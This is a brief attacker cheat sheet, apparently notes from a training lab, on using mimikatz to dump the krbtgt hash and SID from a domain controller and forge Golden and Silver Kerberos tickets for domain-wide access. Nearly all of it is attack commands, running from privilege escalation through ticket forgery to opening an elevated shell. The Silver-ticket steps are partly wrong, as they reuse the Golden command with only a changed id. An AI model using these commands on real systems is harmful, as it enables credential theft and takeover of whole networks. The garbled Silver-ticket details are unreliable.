Dump the krbtgt hash 

﻿mimikatz.exe :

-privilege::debug - ensure this outputs [privilege '20' ok]

﻿-lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. 
To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account.

-net user /domain -> (OUTSIDE mimikatz) - Checks all user accounts (including service accounts)


Create a Golden/Silver Ticket - 

-Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:500 - Creates a GOLDEN ticket. Input SID, NTLM hash from krbtgt.

-Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:1103 - Creates a SILVER ticket. Input SID, NTLM hash from chosen service.                                                                                       



Use the Golden/Silver Ticket to access other machines -

﻿-misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz.



Note:
If you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; 
however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
